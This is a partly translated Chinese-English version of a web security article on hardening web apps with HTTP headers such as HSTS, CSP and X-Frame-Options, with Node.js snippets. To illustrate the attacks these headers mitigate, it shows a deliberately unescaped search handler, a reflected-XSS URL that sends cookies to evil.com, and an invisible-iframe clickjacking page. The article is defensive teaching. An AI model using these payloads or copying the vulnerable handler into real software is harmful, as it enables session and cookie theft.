> * 原文地址：[How To Secure Your Web App With HTTP Headers](https://www.smashingmagazine.com/2017/04/secure-web-app-http-headers/)
> * 原文作者：[Hagay Lupesko](https://www.smashingmagazine.com/author/hagaylupesko/)
> * 译文出自：[掘金翻译计划](https://github.com/xitu/gold-miner)
> * 译者：[bambooom](https://github.com/bambooom)
> * 校对者：

## 如何使用 HTTP Headers 来保护你的 Web 应用 ##

> Web applications, be they thin websites or thick single-page apps, are notorious targets for cyber-attacks. In 2016, approximately [40% of data breaches](http://www.verizonenterprise.com/verizon-insights-lab/dbir/2016/) originated from attacks on web apps — the leading attack pattern. Indeed, these days, understanding cyber-security is not a luxury but rather **a necessity for web developers**, especially for developers who build consumer-facing applications.

Web 应用，无论是简单的小网页还是复杂的单页应用，众所周知都是网络攻击的目标。2016年，大约 40% 的数据泄露源自对 Web 应用的攻击，这是主要的攻击模式。事实上，现在来说，了解网络安全并不是锦上添花， 而是 Web 开发者的必需任务，特别对于构建面向消费者的产品的开发人员。

> HTTP response headers can be leveraged to tighten up the security of web apps, typically just by adding a few lines of code. In this article, we’ll show how web developers can use HTTP headers to build secure apps. While the code examples are for Node.js, setting HTTP response headers is supported across all major server-side-rendering platforms and is typically simple to set up.

开发者可以利用 HTTP 响应头来加强 Web 应用程序的安全性，通常只需要添加几行代码即可。本文将结束 web 开发者如何利用 HTTP Headers 来构建安全的应用。虽然本文的示例代码是 Node.js，但是设置 HTTP 响应头基本在所有主要的服务端语言都是简单易设置的。

### 关于 HTTP Headers ###

> Technically, HTTP headers are simply fields, encoded in clear text, that are part of the HTTP request and response message header. They are designed to enable both the HTTP client and server to send and receive meta data about the connection to be established, the resource being requested, as well as the returned resource itself.

技术上，HTTP 头只是简单的字段，咦明文形式编码，这是 HTTP 请求和响应消息头的一部分。它们旨在使客户端和服务端都能够发送和接受有关要建立的连接元数据、所请求的资源，以及返回的资源本身的元数据。

> Plain-text HTTP response headers can be examined easily using cURL, with the `--head` option, like so:

可以使用 cURL `--head` 选项轻松检查纯文本 HTTP 响应头，例如:

```sh
$ curl --head https://www.google.com
HTTP/1.1 200 OK
Date: Thu, 05 Jan 2017 08:20:29 GMT
Expires: -1
Cache-Control: private, max-age=0
Content-Type: text/html; charset=ISO-8859-1
Transfer-Encoding: chunked
Accept-Ranges: none
Vary: Accept-Encoding
…
```

> Today, hundreds of headers are used by web apps, some standardized by the [Internet Engineering Task Force](https://www.ietf.org/) (IETF), the open organization that is behind many of the standards that power the web as we know it today, and some proprietary. HTTP headers provide a flexible and extensible mechanism that enables the rich and varying use cases found on the web today.

现在，数百种响应头正在被 web 应用所使用，其中一部分由[互联网工程任务组, IETF](https://www.ietf.org/)标准化。IETF 是一个开发性组织，今天我们所熟知的许多 web 标准或专利都是由他们进行推进的。HTTP 头提供了一种灵活可扩展的机制，造就了现今的网络各种丰富多变的用例。

### 机密资源禁用缓存 ###

> Caching is a valuable and effective technique for optimizing performance in client-server architectures, and HTTP, which leverages caching extensively, is no exception. However, in cases where the cached resource is confidential, caching can lead to vulnerabilities — and must be avoided. As an example, consider a web app that renders and caches a page with sensitive information and is being used on a shared PC. Anyone can view confidential information rendered by that web app simply by visiting the browser’s cache, or sometimes even as easily as clicking the browser’s “back” button!

缓存是优化客户端-服务端架构性能中有效的技术，广泛利用缓存的 HTTP 也不例外。但是，在缓存的资源是保密的情况下，缓存可能导致漏斗，所以必须避免。假设一个 web 应用对含有敏感信息的网页进行缓存，并且是在一台公用的 PC 上使用。任何人可以通过访问浏览器的缓存看到这个 web 应用上的敏感信息，甚至有时仅仅通过点击浏览器的返回按钮就可以看到。

> The IETF’s [RFC 7234](https://tools.ietf.org/html/rfc7234), which defines HTTP caching, specifies the default behavior of HTTP clients, both browsers and intermediary Internet proxies, to *always* cache responses to HTTP `GET` requests — unless specified otherwise. While this enables HTTP to boost performance and reduce network congestion, it could also expose end users to theft of personal information, as mentioned above. The good news is that the HTTP specification also defines a pretty simple way to instruct clients not to cache a given response, through the use of — you guessed it! — HTTP response headers.

IETF 的 [RFC 7234](https://tools.ietf.org/html/rfc7234) 上定义了 HTTP 缓存，指定 HTTP 客户端（浏览器以及网络代理）的默认行为，也就是始终缓存对 HTTP GET 请求的相应，除非另行指定。虽然这样可以使 HTTP 提升性能减少网络拥塞，但如上所述，它也有可能使终端用户个人信息被盗。好消息是，HTTP 规范还廷议了一种非常简单的方式来指示客户端对特定响应不进行缓存，通过使用 —— 对，你猜到了 —— HTTP 响应头。

> There are three headers to return when you are returning sensitive information and would like to disable caching by HTTP clients:

当你返回敏感信息并希望禁用 HTTP 客户端的缓存时，有三个头可以返回：

- `Cache-Control`

> This response header, introduced in HTTP 1.1, may contain one or more directives, each carrying a specific caching semantic, and instructing HTTP clients and proxies on how to treat the response being annotated by the header. My recommendation is to format the header as follows: `cache-control: no-cache, no-store, must-revalidate`. These three directives pretty much instruct clients and intermediary proxies not to use a previously cached response, not to store the response, and that even if the response is somehow cached, the cache must be revalidated on the origin server.

从 HTTP 1.1 引入的此响应头可能包含一个或多个指令，每个指令带有特定的缓存语义，指示 HTTP 客户端和代理如何处理有此响应头注释的响应。我推荐如下指定响应头，`cache-control: no-cache, no-store, must-revalidate`。这三个指令基本上可以指示客户端和中间代理不可使用之前缓存的响应，不可存储响应，甚至就算响应被缓存，也必须从源服务器上重新验证。

- `Pragma: no-cache`

> For backwards-compatibility with HTTP 1.0, you will want to include this header as well. Some HTTP clients, especially intermediary proxies, still might not fully support HTTP 1.1 and so will not correctly handle the `Cache-Control` header mentioned above. Use `Pragma: no-cache` to ensure that these older clients do not cache your response.

为了与 HTTP 1.0 的向后兼容性，你还需要包含此响应头。有部分客户端，特别是中间代理，可能仍然没有完全支持 HTTP 1.1，所以不能正确处理前面提到的 `Cache-Control` 响应头，所以使用 `Pragma: no-cache` 确保较旧的客户端不缓存你的响应。

- `Expires: -1`

> This header specifies a timestamp after which the response is considered stale. By specifying `-1`, instead of an actual future time, you ensure that clients immediately treat this response as stale and avoid caching.

此标头指定了该响应过时的时间戳。如果不指定为未来某个真实时间而指定为 `-1`，可以保证客户端立即将此响应视为过时并避免缓存。

> Note that, while disabling caching enhances the security of your web app and helps to protect confidential information, is does come at the price of a performance hit. Make sure to disable caching only for resources that actually require confidentiality and not just for any response rendered by your server! For a deeper dive into best practices for caching web resources, I highly recommend reading [Jake Archibald’s post](https://jakearchibald.com/2016/caching-best-practices/) on the subject.

需要注意的是，禁用缓存提高安全性及保护机密资源的同时，也的确会带来性能上的折损。所以确保仅对实际需要保密性的资源禁用缓存，而不是对任何服务器的响应禁用。想要更深入了解 web 资源缓存的最佳实践，我推荐阅读 [Jake Archibald 的文章](https://jakearchibald.com/2016/caching-best-practices/)。

> Here’s how you would program these headers in Node.js:

下面是 Node.js 中设置响应头的示例代码：

```javascript
function requestHandler(req, res) {
	res.setHeader('Cache-Control','no-cache,no-store,max-age=0,must-revalidate');
	res.setHeader('Pragma','no-cache');
	res.setHeader('Expires','-1');
}
```

### 强制 HTTPS ###

> Today, the importance of HTTPS is widely recognized by the tech community. More and more web apps configure secured endpoints and are redirecting unsecure traffic to secured endpoints (i.e. HTTP to HTTPS redirects). Unfortunately, end users have yet to fully comprehend the importance of HTTPS, and this lack of comprehension exposes them to various man-in-the-middle (MitM) attacks. The typical user navigates to a web app without paying much attention to the protocol being used, be it secure (HTTPS) or unsecure (HTTP). Moreover, many users will just click past browser warnings when their browser presents a certificate error or warning!

今天，HTTPS 的重要性已经得到了科技界的广泛认可。越来越多的 web 应用配置了安全端点，并将不安全网路重定向到安全端点（即 HTTP 重定向至 HTTPS）。不幸的是，终端用户还未完全理解 HTTPS 的重要性，这种缺乏理解使他们面临着各种中间人攻击（MitM）。典型的用户访问到一个 web 应用时，并不会注意到正在使用的网络协议是安全的（HTTPS）还是不安全的（HTTP）。

> The importance of interacting with web apps over a valid HTTPS connection cannot be overstated: An unsecure connection exposes the user to various attacks, which could lead to cookie theft or worse. As an example, it is not very difficult for an attacker to spoof network frames within a public Wi-Fi network and to extract the session cookies of users who are not using HTTPS. To make things even worse, even users interacting with a web app over a secured connection may be exposed to downgrade attacks, which try to force the connection to be downgraded to an unsecure connection, thus exposing the user to MitM attacks.

通过有效的 HTTPS 连接与 web 应用进行交互的重要性怎么说都不算夸大：不安全的连接将用户暴露给各种攻击，这可能导致 cookie 被盗甚至更糟。举个例子，攻击者可以轻易在公共 Wi-Fi 网络下骗过网络帧并提起不使用 HTTPS 的用户的会话 cookie。更糟的情况是，即使用户通过安全连接与 web 永盈进行交互也可能遭受降级攻击，这种攻击试图强制将连接降级到不安全的连接，从而是用户收到中间人攻击。

> How can we help users avoid these attacks and better enforce the usage of HTTPS? Enter the HTTP Strict Transport Security (HSTS) header. Put simply, HSTS makes sure all communications with the origin host are using HTTPS. Specified in [RFC 6797](https://tools.ietf.org/html/rfc6797), HSTS enables a web app to instruct browsers to allow *only* HTTPS connections to the origin host, to internally redirect all unsecure traffic to secured connections, and to automatically upgrade all unsecure resource requests to be secure.

我们如何帮助用户避免这些攻击，并更好地实施 HTTPS 的使用呢？使用 HTTP 严格传输安全头（HSTS）。简单来说，HSTS 确保与源主机间的所有通信都使用 HTTPS。[RFC 6797](https://tools.ietf.org/html/rfc6797) 中说明了，HSTS可以使 web 应用程序指示浏览器仅允许与源主机之间的 HTTPS 连接，将所有不安全的连接内部重定向到安全连接，并自动将所有不安全的资源请求升级为安全请求。

> HSTS directives include the following:

HSTS 的指令如下：

- `max-age=<number of seconds>`

>This instructs the browser to cache this header, for this domain, for the specified number of seconds. This can ensure tightened security for a long duration!

此项指示浏览器对此域缓存此响应头指定的秒数。这样可以保证长时间的加固安全。

- `includeSubDomains`

>This instructs the browser to apply HSTS for all subdomains of the current domain. This can be useful to cover all current and future subdomains you may have.

此项指示浏览器对当前域的所有子域应用 HSTS，这可以用于覆盖你可能有的所有当前和未来的子域。

- `preload`

> This is a powerful directive that forces browsers to *always* load your web app securely, even on the first hit, before the response is even received! This works by hardcoding a list of HSTS preload-enabled domains into the browser’s code. To enable the preloading feature, you need to register your domain with [HSTS Preload List Submission](https://hstspreload.org), a website maintained by Google’s Chrome team. Once registered, the domain will be prebuilt into supporting browsers to always enforce HSTS. The preload directive within the HTTP response header is used to confirm registration, indicating that the web app and domain owner are indeed interested in being on the preload list.

这是一个强大的指令，强制浏览器始终安全加载你的 web 应用程序，即使是第一次收到响应之前加载！这是通过将启用 HSTS 预加载域的列表硬编码到浏览器的代码中实现的。要启用预加载功能，你需要在 Google Chrome 团队维护的网站 [HSTS 预加载列表提交](https://hstspreload.org)注册你的域。

> A word of caution: using the `preload` directive also means it cannot be easily undone, and carries an update lead time of months! While preload certainly improves your app’s security, it also means you need to be fully confident your app can support HTTPS-only!

注意谨慎使用 `preload`，因为这意味着它不能轻易撤销，并带有几个月前的更新。虽然预加载肯定会应用程序的安全性，但也意味着你需要充分确信你的应用程序可以支持仅 HTTPS！

> My recommendation is to use `Strict-Transport-Security: max-age=31536000; includeSubDomains;` which instructs the browser to enforce a valid HTTPS connection to the origin host and to all subdomains for a year. If you are confident that your app can handle HTTPS-only, I would also recommend adding the `preload` directive, in which case don’t forget to register your website on the preload list as well, as noted above!

我推荐的用法是 `Strict-Transport-Security: max-age=31536000; includeSubDomains;`，这样指示了浏览器强制通过 HTTPS 连接到源主机并且有效期为一年。如果你对你的 app 处理 HTTPS 限定很有信心，我也推荐加上 `preload` 指令，当然别忘记去前面提到的预加载列表注册你的网站。

> Here’s what implementing HSTS looks like in Node.js:

以下是在 Nodes.js 中实现 HSTS 的方法：

```javascript
function requestHandler(req, res){
	res.setHeader('Strict-Transport-Security','max-age=31536000; includeSubDomains; preload');
}
```

### Enabling XSS Filtering ###

In a reflected cross-site scripting attack (reflected XSS), an attacker injects malicious JavaScript code into an HTTP request, with the injected code “reflected” in the response and executed by the browser rendering the response, enabling the malicious code to operate within a trusted context, accessing potentially confidential information such as session cookies. Unfortunately, XSS is a pretty common web app attack, and a surprisingly effective one!

To understand a reflected XSS attack, consider the Node.js code below, rendering mywebapp.com, a mock and intentionally simple web app that renders search results alongside the search term requested by the user:

```
function handleRequest(req, res) {
    res.writeHead(200);

    // Get the search term
    const parsedUrl = require('url').parse(req.url);
    const searchTerm = decodeURI(parsedUrl.query);
    const resultSet = search(searchTerm);

    // Render the document
    res.end(
        "<html>" +
            "<body>" +
                "<p>You searched for: " + searchTerm + "</p>" +
                // Search results rendering goes here…
            "</body>" +
        "</html>");
};
```

Now, consider how will the web app above handle a URL constructed with malicious executable code embedded within the URL, such as this:

```
https://mywebapp.com/search?</p><script>window.location=“http://evil.com?cookie=”+document.cookie</script>
```

As you may realize, this URL will make the browser run the injected script and send the user’s cookies, potentially including confidential session cookies, to evil.com!

To help protect users against reflective XSS attacks, some browsers have implemented protection mechanisms. These mechanisms try to identify these attacks by looking for matching code patterns in the HTTP request and response. Internet Explorer was the first browser to introduce such a mechanism with its XSS filter, introduced in Internet Explorer 8 back in 2008, and WebKit later introduced XSS Auditor, available today in Chrome and Safari. (Firefox has no similar mechanism built in, but users can use add-ons to gain this functionality.) These various protection mechanisms are not perfect: They may fail to detect a real XSS attack (a false negative), and in other cases may block legitimate code (a false positive). Due to the latter, browsers allow users to disable the XSS filter via the settings. Unfortunately, this is typically a global setting, which turns off this security feature completely for all web apps loaded by the browser.

Luckily, there is a way for a web app to override this configuration and ensure that the XSS filter is turned on for the web app being loaded by the browser. This is done via the `X-XSS-Protection` header. This header, supported by Internet Explorer (from version 8), Edge, Chrome and Safari, instructs the browser to turn on or off the browser’s built-in protection mechanism and to override the browser’s local configuration.

`X-XSS-Protection` directives include these:

- `1` or `0`

This enables or disables the filter.
- `mode=block`

This instructs the browser to prevent the entire page from rendering when an XSS attack is detected.

I recommend always turning on the XSS filter, as well as block mode, to maximize user protection. Such a response header looks like this:

```
X-XSS-Protection: 1; mode=block
```

Here’s how you would configure this response header in Node.js:

```
functionrequestHandler(req, res){
	res.setHeader('X-XSS-Protection','1;mode=block');}
```

### Controlling Framing ###

An iframe (or HTML inline frame element, if you want to be more formal) is a DOM element that allows a web app to be nested within a parent web app. This powerful element enables some important web use cases, such as embedding third-party content into web apps, but it also has significant drawbacks, such as not being SEO-friendly and not playing nice with browser navigation — the list goes on.

One of the caveats of iframes is that it makes clickjacking easier. Clickjacking is an attack that tricks the user into clicking something different than what they think they’re clicking. To understand a simple implementation of clickjacking, consider the HTML markup below, which tries to trick the user into buying a toaster when they think they are clicking to win a prize!

```
<html>
  <body>
    <button class='some-class'>Win a Prize!</button>
    <iframe class='some-class' style='opacity: 0;’ src='http://buy.com?buy=toaster'></iframe>
  </body>
</html>
```

Clickjacking has many malicious applications, such as tricking the user into confirming a Facebook like, purchasing an item online and even submitting confidential information. Malicious web apps can leverage iframes for clickjacking by embedding a legitimate web app inside their malicious web app, rendering the iframe invisible with the `opacity: 0` CSS rule, and placing the iframe’s click target directly on top of an innocent-looking button rendered by the malicious web app. A user who clicks the innocent-looking button will trigger a click on the embedded web app — without at all knowing the effect of their click.

An effective way to block this attack is by restricting your web app from being framed. `X-Frame-Options`, specified in [RFC 7034](https://www.ietf.org/rfc/rfc7034.txt), is designed to do exactly that! This header instructs the browser to apply limitations on whether your web app can be embedded within another web page, thus blocking a malicious web page from tricking users into invoking various transactions on your web app. You can either block framing completely using the `DENY` directive, whitelist specific domains using the `ALLOW-FROM` directive, or whitelist only the web app’s origin using the `SAMEORIGIN` directive.

My recommendation is to use the `SAMEORIGIN` directive, which enables iframes to be leveraged for apps on the same domain — which may be useful at times — and which maintains security. This recommended header looks like this:

```
X-Frame-Options: SAMEORIGIN
```

Here’s an example of a configuration of this header to enable framing on the same origin in Node.js:

```
functionrequestHandler(req, res){
	res.setHeader('X-Frame-Options','SAMEORIGIN');}
```

### Explicitly Whitelisting Sources ###

As we’ve noted earlier, you can add in-depth security to your web app by enabling the browser’s XSS filter. However, note that this mechanism is limited, is not supported by all browsers (Firefox, for instance, does not have an XSS filter) and relies on pattern-matching techniques that can be tricked.

Another layer of in-depth protection against XSS and other attacks can be achieved by explicitly whitelisting trusted sources and operations — which is what Content Security Policy (CSP) enables web app developers to do.

CSP is a [W3C specification](https://www.w3.org/TR/2016/WD-CSP3-20160901/) that defines a powerful browser-based security mechanism, enabling granular control over resource-loading and script execution in a web app. With CSP, you can whitelist specific domains for operations such as script-loading, AJAX calls, image-loading and style sheet-loading. You can enable or disable inline scripts or dynamic scripts (the notorious `eval`) and control framing by whitelisting specific domains for framing. Another cool feature of CSP is that it allows you to configure a real-time reporting target, so that you can monitor your app in real time for CSP blocking operations.

This explicit whitelisting of resource loading and execution provides in-depth security that in many cases will fend off attacks. For example, by using CSP to disallow inline scripts, you can fend off many of the reflective XSS attack variants that rely on injecting inline scripts into the DOM.

CSP is a relatively complex header, with a lot of directives, and I won’t go into the details of the various directives. HTML5 Rocks has a [great tutorial](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) that provides an overview of CSP, and I highly recommend reading it and learning how to use CSP in your web app.

Here’s a simple example of a CSP configuration to allow script-loading from the app’s origin only and to block dynamic script execution (`eval`) and inline scripts (as usual, on Node.js):

```
functionrequestHandler(req, res){
	res.setHeader('Content-Security-Policy',"script-src 'self'");}
```

### Preventing Content-Type Sniffing ###

In an effort to make the user experience as seamless as possible, many browsers have implemented a feature called content-type sniffing, or MIME sniffing. This feature enables the browser to detect the type of a resource provided as part of an HTTP response by “sniffing” the actual resource bits, regardless of the resource type declared through the `Content-Type` response header. While this feature is indeed useful in some cases, it introduces a vulnerability and an attack vector known as a MIME confusion attack. A MIME-sniffing vulnerability enables an attacker to inject a malicious resource, such as a malicious executable script, masquerading as an innocent resource, such as an image. With MIME sniffing, the browser will ignore the declared image content type, and instead of rendering an image will execute the malicious script.

Luckily, the `X-Content-Type-Options` response header mitigates this vulnerability! This header, introduced in Internet Explorer 8 back in 2008 and currently supported by most major browsers (Safari is the only major browser not to support it), instructs the browser not to use sniffing when handling fetched resources. Because `X-Content-Type-Options` was only formally specified as part of the [“Fetch” specification](https://fetch.spec.whatwg.org/#x-content-type-options-header), the actual implementation varies across browsers; some (Internet Explorer and Edge) completely avoid MIME sniffing, whereas others (Firefox) still MIME sniff but rather block executable resources (JavaScript and CSS) when an inconsistency between declared and actual types is detected. The latter is in line with the latest Fetch specification.

`X-Content-Type-Options` is a simple response header, with only one directive: `nosniff`. This header looks like this: `X-Content-Type-Options: nosniff`. Here’s an example of a configuration of the header:

```
functionrequestHandler(req, res){
	res.setHeader('X-Content-Type-Options','nosniff');}
```

### Summary ###

In this article, we have seen how to leverage HTTP headers to reinforce the security of your web app, to fend off attacks and to mitigate vulnerabilities.

#### Takeaways ####

- Disable caching for confidential information using the `Cache-Control` header.
- Enforce HTTPS using the `Strict-Transport-Security` header, and add your domain to Chrome’s preload list.
- Make your web app more robust against XSS by leveraging the `X-XSS-Protection` header.
- Block clickjacking using the `X-Frame-Options` header.
- Leverage `Content-Security-Policy` to whitelist specific sources and endpoints.
- Prevent MIME-sniffing attacks using the `X-Content-Type-Options` header.

Remember that for the web to be truly awesome and engaging, it has to be secure. Leverage HTTP headers to build a more secure web!



(**Disclaimer:** The content of this post is my own and doesn’t represent my past or current employers in any way whatsoever.)

*Front page image credits: [Pexels.com](https://www.pexels.com/photo/coffee-writing-computer-blogging-34600/).*

---

> [掘金翻译计划](https://github.com/xitu/gold-miner) 是一个翻译优质互联网技术文章的社区，文章来源为 [掘金](https://juejin.im) 上的英文分享文章。内容覆盖 [Android](https://github.com/xitu/gold-miner#android)、[iOS](https://github.com/xitu/gold-miner#ios)、[React](https://github.com/xitu/gold-miner#react)、[前端](https://github.com/xitu/gold-miner#前端)、[后端](https://github.com/xitu/gold-miner#后端)、[产品](https://github.com/xitu/gold-miner#产品)、[设计](https://github.com/xitu/gold-miner#设计) 等领域，想要查看更多优质译文请持续关注 [掘金翻译计划](https://github.com/xitu/gold-miner)。
